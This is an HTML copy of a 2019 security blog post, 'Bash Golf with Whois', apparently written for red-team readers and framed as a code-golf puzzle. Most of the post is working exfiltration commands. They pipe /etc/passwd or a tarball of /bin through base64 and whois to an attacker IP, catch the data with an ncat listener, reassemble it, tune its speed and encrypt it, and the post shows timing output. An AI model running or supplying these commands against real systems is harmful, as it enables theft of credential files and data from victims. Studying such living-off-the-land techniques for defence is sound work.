<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &amp;ldquo;Print all prime numbers from 1 to 100&amp;rdquo;, and then try to do so in the most efficient / least amount of lines possible.
There is a great website where these challenges can be found: https://code-golf.io/
I enjoy playing code golf, so when I saw the following tweet, I had to try it out:" />
<meta name="keywords" content=", bash, whois, netcat, ncat, xargs, tee" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://malicious.link/post/2019/bash-golf-with-whois/" />


    <title>
        
            Bash Golf with Whois :: malicious.link  â€” welcome
        
    </title>


<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.a6537515292628f292bc89dc1bb6a3480b72f307b458bdd65364ae5b8b20399d.css">






<meta itemprop="name" content="Bash Golf with Whois">
<meta itemprop="description" content="If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &ldquo;Print all prime numbers from 1 to 100&rdquo;, and then try to do so in the most efficient / least amount of lines possible.
There is a great website where these challenges can be found: https://code-golf.io/
I enjoy playing code golf, so when I saw the following tweet, I had to try it out:">
<meta itemprop="datePublished" content="2019-05-20T09:30:44-05:00" />
<meta itemprop="dateModified" content="2019-05-20T09:30:44-05:00" />
<meta itemprop="wordCount" content="967">



<meta itemprop="keywords" content="bash,whois,netcat,ncat,xargs,tee," />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Bash Golf with Whois"/>
<meta name="twitter:description" content="If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &ldquo;Print all prime numbers from 1 to 100&rdquo;, and then try to do so in the most efficient / least amount of lines possible.
There is a great website where these challenges can be found: https://code-golf.io/
I enjoy playing code golf, so when I saw the following tweet, I had to try it out:"/>







    <meta property="article:published_time" content="2019-05-20 09:30:44 -0500 -0500" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/post/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">boot mubix.kernel</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://malicious.link/about">About</a></li><li><a href="https://malicious.link/brandon">Brandon</a></li><li><a href="https://malicious.link/post">Posts</a></li><li><a href="https://malicious.link/start">Start</a></li><li><a href="https://malicious.link/tags">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://malicious.link/post/2019/bash-golf-with-whois/">Bash Golf with Whois</a></h2>
            <p>Published: 20 May 2019 - 09:30 -0500</p>

            

            

            <div class="post-content">
                <p>If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &ldquo;<a href="https://code-golf.io/prime-numbers">Print all prime numbers from 1 to 100</a>&rdquo;, and then try to do so in the most efficient / least amount of lines possible.</p>
<p>There is a great website where these challenges can be found: <a href="https://code-golf.io/">https://code-golf.io/</a></p>
<p>I enjoy playing code golf, so when I saw the following tweet, I had to try it out:</p>
<p>The tweet 1102558893513687040 from <a href="https://twitter.com/Kevin2600">@Kevin2600</a> was deleted but it had the following commands in the image: (making up an IP since it was blacked out):</p>
<p><strong>Victim</strong>:</p>
<pre><code>whois -h 10.110.10.81 -p 4444 `cat /etc/passwd | base64`
</code></pre><p><strong>Attacker</strong>:</p>
<pre><code>nc -l -p 4444
</code></pre><p>Now, a lot of respondents mentioned that you could use the <code>/dev/tcp</code> method or <code>awk</code>.</p>
<blockquote class="twitter-tweet" data-conversation="none" data-lang="en"><p lang="en" dir="ltr">Why whois?<br><br>TCP<a href="https://t.co/6UstTUeJ4M">https://t.co/6UstTUeJ4M</a><br><br>awk<a href="https://t.co/QlCoAXFvKh">https://t.co/QlCoAXFvKh</a><br><br>Much easier and faster!</p>&mdash; Malwrologist (@DissectMalware) <a href="https://twitter.com/DissectMalware/status/1102781062911066112?ref_src=twsrc%5Etfw">March 5, 2019</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>While this is awesome and true, and for practicality should be used instead of <code>whois</code>,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can&rsquo;t use either of those and <code>whois</code> is still there.</p>
<p>This is the solution I came up with to both increase the file size limit, and add a bit of error correction:</p>
<p>(Here is my reply: <a href="https://twitter.com/mubix/status/1102780435271176198">https://twitter.com/mubix/status/1102780435271176198</a>)</p>
<h3 id="first-we-set-up-a-listener">First we set up a listener:</h3>
<pre><code>root@attackbox:~# ncat -k -l -p 4444 | tee files.b64
</code></pre><p><code>tee</code> is used to pipe the contents to a file as well as see it on the console so you can make sure you have it. You can substitute this with just <code>&gt; files.b64</code> if you wish.</p>
<p>Options:</p>
<ul>
<li><code>-k</code>: means keep the connection open. We need this option as we are going to be doing many requests with <code>whois</code></li>
<li><code>-l</code>: listen on a port.. and</li>
<li><code>-p</code>: what port to listen on</li>
</ul>
<h3 id="next-we-send-the-files-over-the-wire">Next we send the files over the wire:</h3>
<pre><code>root@victim:~# tar czf - /bin/* | base64 | xargs -I bits timeout 0.03 whois -h 192.168.80.107 -p 4444 bits
</code></pre><p>Breakdown:</p>
<ul>
<li><code>tar czf - /bin/*</code>: Create a <code>tar</code> ball using compression(<code>c</code>), and gzip(<code>z</code>) to the file(<code>f</code>) of standard output(<code>-</code>) using all of the files in the <code>bin</code> folder (<code>/bin/*</code>)</li>
<li><code>base64</code>: Base64 encode that standard output</li>
<li><code>xargs -I bits</code>: for every line do the following command while replacing the word <code>bits</code> in the command with the contents of the preceding lines (from the base64)</li>
<li><code>timeout 0.03</code>: This times out the <code>whois</code> command so that it closes the connection because there isn&rsquo;t a response from the other end (it&rsquo;s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to <code>0.10</code> or similar for doing things across the Internet.</li>
<li><code>whois -h 192.168.80.107 -p 4444 bits</code>: Send the <code>bits</code>(which is replaced with the base64 line) <code>whois</code> query to <code>192.168.80.107</code> over port <code>4444</code>.</li>
</ul>
<p>What you should see on the attacker side is a bunch of Base64 lines scrolling across the screen.</p>
<h3 id="finally">Finally:</h3>
<pre><code>root@attackbox:~# cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv
</code></pre><p>Breakdown:</p>
<ul>
<li><code>cat files.b64</code>: print all the base64 lines to standard output</li>
<li><code>tr -d '\r\n'</code>: remove all the newlines and returns to make one long base64 line to decode</li>
<li><code>base64 -d</code>: decode the base64 line</li>
<li><code>tar zxv</code>: <code>x</code> extract the tar ball using <code>z</code> gzip and be <code>v</code> verbose about it.</li>
</ul>
<h3 id="errors">Errors:</h3>
<ul>
<li>
<p>If you receive a <code>base64: invalid input</code> when doing the final step it is most likely that your timeout was too fast and some of the lines didn&rsquo;t transfer completely.</p>
</li>
<li>
<p>If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you&rsquo;ll see below).</p>
</li>
</ul>
<pre><code>bin/bash
bin/brltty

gzip: stdin: invalid compressed data--format violated
tar: Unexpected EOF in archive
tar: Unexpected EOF in archive
tar: Error is not recoverable: exiting now
</code></pre><h3 id="improvements">Improvements:</h3>
<h4 id="speed">Speed:</h4>
<p>One improvement to the speed is the number of bytes you send with each <code>whois</code> request, which is based on the line length of the base64 output with the <code>-w</code> flag. I have been able to increase this to 255 without much trouble like so: <code>base64 -w255</code></p>
<p>Example:</p>
<pre><code>tar czf - /bin/* | base64 -w255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
</code></pre><p>Even with this speed up sending all of <code>/bin/</code> took 98 minutes using a timeout of <code>0.20</code>. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you&rsquo;ll end up with corrupted data if you go too fast.</p>
<p>Size of <code>/bin/</code>:</p>
<pre><code>root@victim:~# du -h /bin/
13M     /bin/
</code></pre><p>Total time:</p>
<pre><code>root@victim:~# time tar czf - /bin/* | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits

real    98m7.673s
user    1m25.792s
sys     0m46.706s
</code></pre><h4 id="encryption">Encryption:</h4>
<p>While adding encryption will add more complexity and size to the transfer it will ensure confidentiality of the data being transfered. Simply adding <code>openssl enc -e -aes256 -out -</code> to the line before the <code>base64</code> works to solve this (as long as you select a good password). You will also need a full TTY (interactive terminal) to do this as it will prompt you for a password twice.</p>
<p>Example:</p>
<pre><code>tar czf - /bin/* | openssl enc -e -aes256 -out - | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
</code></pre><h2 id="challenge">Challenge</h2>
<p>Think you can make this more efficient? Add error correction? I would love to see tweets or comments stating where this can be improved using only built in binaries (no python/ruby/perl/awk). Let me know! I look forward to hearing from you.</p>
<h2 id="other-methods">Other methods</h2>
<p>For those looking for a lot more file uploads or other such exploitation techniques, check out <a href="https://gtfobins.github.io/">GTFOBins</a> and in particular <a href="https://gtfobins.github.io/#+file%20upload">https://gtfobins.github.io/#+file%20upload</a>. <code>whois</code> is detailed here: <a href="https://gtfobins.github.io/gtfobins/whois/">https://gtfobins.github.io/gtfobins/whois/</a></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://malicious.link/tags/bash/">bash</a></span>
        <span class="tag"><a href="https://malicious.link/tags/whois/">whois</a></span>
        <span class="tag"><a href="https://malicious.link/tags/netcat/">netcat</a></span>
        <span class="tag"><a href="https://malicious.link/tags/ncat/">ncat</a></span>
        <span class="tag"><a href="https://malicious.link/tags/xargs/">xargs</a></span>
        <span class="tag"><a href="https://malicious.link/tags/tee/">tee</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
            <span><a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
          </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>



    </body>
</html>
